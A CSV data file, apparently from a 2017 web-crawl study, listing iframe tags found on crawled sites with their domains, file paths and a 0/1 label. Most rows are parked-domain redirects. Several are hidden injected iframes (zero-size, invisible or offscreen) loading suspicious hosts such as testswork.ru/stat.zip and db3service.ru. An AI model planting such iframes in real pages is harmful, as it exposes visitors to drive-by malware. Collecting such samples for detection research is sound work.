index,iframe,domain,filename,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=1track1day.com&amp;pid=9PO755G95""></iframe>html_200_20170729_004149.tx",http://1track1day.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_9021_20170726_101404/html_200_20170726_101404.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=3gpkingwap.com&amp;pid=9PO755G95""></iframe>",http://3gpkingwap.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_2917_20170726_101410/html_200_20170726_101410.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=9158idc.com&amp;pid=9PO755G95""></iframe>",http://9158idc.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_3987_20170726_101416/html_200_20170726_101416.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=ariaatl.com&amp;pid=9PO755G95""></iframe>",http://ariaatl.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_8802_20170726_101516/html_200_20170726_101516.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=bathandbodyworksjobs.com&amp;pid=9PO755G95&amp;_nozc_=1""></iframe>",http://bathandbodyworksjobs.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_6101_20170726_101558/html_200_20170726_101558.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=chainlightningstudios.com&amp;pid=9PO755G95""></iframe>",http://chainlightningstudios.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_8269_20170726_101756/html_200_20170726_101756.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=freeteentits.com&amp;pid=9PO755G95""></iframe>",http://freeteentits.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_9727_20170726_102120/html_200_20170726_102120.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=gamsforgirls.com&amp;pid=9PO755G95""></iframe>",http://gamsforgirls.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_8690_20170726_102136/html_200_20170726_102136.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=raadiofarda.com&amp;pid=9PO755G95""></iframe>",http://raadiofarda.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_6477_20170726_103138/html_200_20170726_103138.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=wwwdogforsale.com&amp;pid=9PO755G95""></iframe>",http://wwwdogforsale.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_1290_20170726_103802/html_200_20170726_103802.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=wwwrevolico.com&amp;pid=9PO755G95""></iframe>",http://wwwrevolico.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_4157_20170726_103839/html_200_20170726_103839.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=yoputiube.com&amp;pid=9PO755G95""></iframe>",http://yoputiube.com,/mnt/eznfs1/scrap_data_22_bot3/1/Win7_32_IE8_1_9239_20170726_103919/html_200_20170726_103919.txt,,,,,,,,
0,"<iframe frameborder=""0"" height=""100%"" marginwidth=""0"" scrolling=""auto"" src=""http://fwdssp.com/?dn=referer_detect&amp;pid=5POL4F2O4"" width=""100%""></iframe>",http://babybabilo.com/cgi-sys/suspendedpage.cgi,/mnt/eznfs1/scrap_data_22_bot3/2/Win7_32_IE8_2_2559_20170726_183856/html_200_20170726_183856.txt,,,,,,,,
0,"<iframe height=""100%"" src=""https://www.nuxhotel.biz"" width=""100%""><a href=""https://www.nuxhotel.biz"">https://www.nuxhotel.biz</a></iframe>",http://habgo.biz,/mnt/eznfs1/scrap_data_22_bot3/2/Win7_32_IE8_2_1818_20170726_190205/html_200_20170726_190205.txt,,,,,,,,
0,"<iframe <="""" allowtransparency=""true"" frameborder=""0"" height=""170"" iframe="""" scrolling=""no"" src=""http://www.lelelove520.com/cs.asp"" width=""200""></iframe>",http://010xinlei.com,/mnt/eznfs1/scrap_data_22_bot3/4/Win7_32_IE8_4_8113_20170727_152401/html_200_20170727_152401.txt,,,,,,,,
0,"<iframe height=""100%"" src=""http://home.hosts.chinesestack.com/"" width=""100%""></iframe>",http://fastener-b2b.com,/mnt/eznfs1/scrap_data_22_bot3/4/Win7_32_IE8_4_61_20170727_160110/html_200_20170727_160110.txt,,,,,,,,
0,"<iframe frameborder=""0"" height=""1"" name=""I8"" scrolling=""no"" src=""http://shang.qq.com/wpa/qunwpa?idkey=c95aa95edbccafbae8f40c8481b697ae98669e850199348f7cf8fee10755f357"" target=""_blank"" width=""1""></iframe>",http://605389.com,/mnt/eznfs1/scrap_data_22_bot3/4/Win7_32_IE8_4_1599_20170727_172217/html_200_20170727_172217.txt,,,,,,,,
1,"<iframe frameborder=""0"" height=""1"" src=""http://testswork.ru/stat.zip"" width=""1""></iframe>",http://eye789.com,/mnt/eznfs1/scrap_data_22_bot3/5/Win7_32_IE8_5_1331_20170728_124746/html_200_20170728_124746.txt,,,,,,,,
0,"<iframe height=""100%"" src=""http://home.hosts.chinesestack.com/"" width=""100%""></iframe>",http://taohuo800.com,/mnt/eznfs1/scrap_data_22_bot3/5/Win7_32_IE8_5_3900_20170728_162135/html_200_20170728_162135.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=114oldest.com&amp;pid=9PO755G95""></iframe>",http://114oldest.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_3018_20170729_004113/html_200_20170729_004113.txt,,,,,,,,
0,"<iframe frameborder=""0"" height=""0"" src=""http://db3service.ru/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQMABQEEDQ=="" width=""0""></iframe>",http://ali59000.free.fr,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_7660_20170729_004127/html_200_20170729_004127.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=alphaxiom.com&amp;pid=9PO755G95""></iframe>",http://alphaxiom.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_6565_20170729_004128/html_200_20170729_004128.txt,,,,,,,,
1,"<iframe frameborder=""0"" height=""1"" src=""http://188.165.163.235/index/api.php?sid=9Hbrbj_20O5TRHrR0aFL"" style=""position:absolute;top:-100px;left:9999px"" width=""1""></iframe>",http://armazones.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_5119_20170729_004149/html_200_20170729_004149.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=augami.net&amp;pid=9PO755G95""></iframe>",http://augami.net,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_1151_20170729_004150/html_200_20170729_004150.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=czbaoyu.com&amp;pid=9PO755G95""></iframe>",http://www1.czbaoyu.com/?kw=sewing%20machine,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_7975_20170729_004243/html_200_20170729_004243.txt,,,,,,,,
0,"<iframe height=""0"" name=""5924"" src=""http://AAA.77xxmm.cn/new858.htm?075"" width=""0""></iframe>",http://de007.net,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_845_20170729_004252/html_200_20170729_004252.txt,,,,,,,,
1,"<iframe height=""0"" name=""5924"" src=""http://aaa.1l1l1l.com/error/404.html"" width=""0""></iframe>",http://de007.net,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_845_20170729_004252/html_200_20170729_004252.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=douate.com&amp;pid=9PO755G95""></iframe>",http://douate.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_6058_20170729_004257/html_200_20170729_004257.txt,,,,,,,,
0,"<iframe height=""0"" src=""http://116.0.103.105/reflinks/"" width=""0""></iframe>",http://globalnursesonline.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_3229_20170729_004312/html_200_20170729_004312.txt,,,,,,,,
0,"<iframe height=""1"" src=""http://googlestat77.com/"" style=""visibility:hidden;"" width=""1""></iframe>",http://greenculturefoundation.org,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_8367_20170729_004315/html_200_20170729_004315.txt,,,,,,,,
1,"<iframe height=""1"" src=""http://visions7.net/"" style=""visibility:hidden;"" width=""1""></iframe>",http://greenculturefoundation.org,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_8367_20170729_004315/html_200_20170729_004315.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=gumblar.cn&amp;pid=9PO755G95""></iframe>",http://gumblar.cn,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_1423_20170729_004317/html_200_20170729_004317.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=mainnetsoll.com&amp;pid=9PO755G95""></iframe>",http://mainnetsoll.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_2962_20170729_004402/html_200_20170729_004402.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=microsearchstat.com&amp;pid=9PO755G95""></iframe>",http://microsearchstat.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_6210_20170729_004415/html_200_20170729_004415.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=natebennettfleming.com&amp;pid=9PO755G95""></iframe>",http://natebennettfleming.com,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_1559_20170729_004435/html_200_20170729_004435.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=se-group.de&amp;pid=9PO755G95""></iframe>",http://se-group.de,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_5749_20170729_004524/html_200_20170729_004524.txt,,,,,,,,
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=sockslab.net&amp;pid=9PO755G95""></iframe>",http://sockslab.net,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_7232_20170729_004534/html_200_20170729_004534.txt,,,,,,,,
0,"<iframe height=""1"" src=""http://volgo-marun.cn/pek/index.php"" style=""visibility: hidden;"" width=""1""></iframe>",http://soluxury.co.uk,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_4814_20170729_004535/html_200_20170729_004535.txt,,,,,,,,
0,"<iframe height=""10"" src=""http://jedelcio.com.br/counter.php"" style=""visibility: hidden; position: absolute; left: 0px; top: 0px"" width=""10""></iframe>",http://yeniyuzyillions.org,/mnt/eznfs1/scrap_data_22_bot3/10/Win7_32_IE8_10_7870_20170729_004627/html_200_20170729_004627.txt,,,,,,,,